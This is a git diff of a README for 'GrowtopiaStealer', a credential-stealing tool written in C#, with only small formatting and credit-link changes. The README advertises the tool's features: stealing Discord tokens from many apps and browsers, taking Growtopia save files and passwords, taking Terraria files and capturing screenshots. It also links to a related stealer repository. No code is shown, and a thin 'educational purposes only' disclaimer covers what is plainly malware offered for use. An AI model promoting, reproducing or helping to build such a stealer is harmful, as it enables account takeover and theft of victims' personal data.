@@ -1,5 +1,6 @@
 # GrowtopiaStealer
 GrowtopiaStealer powerful stealer written in C#.
+<br/>
 Other Version that stealer: https://github.com/DedSec77/CyberStealer
 
 ## Educational Purposes Only
@@ -29,7 +30,7 @@ Please do not use the program maliciously. This program is intended to be used f
 
 - Steal Discord Tokens from Discord App, DiscordCanary App, DiscordPTB App, Chrome Browser, Chrome Beta Browser,FireFox Browser, Opera Browser, OperaGX Browser, Edge Browser, Yandex Browser, Brave Browser,Vivaldi Browser, Epic Privacy Browser, 360Browser, CocCoc Browser.
 - Steal Growtopia save.dat
-- Show GrowID and Password | thx Zenixas
+- Show GrowID and Password | thx [Zenixas](https://github.com/Zenixas)
 - Show Last World
 - Steal Terraria files input profiles.json, achievements.dat, servers.dat, condig.json.
 - Show Screenshot
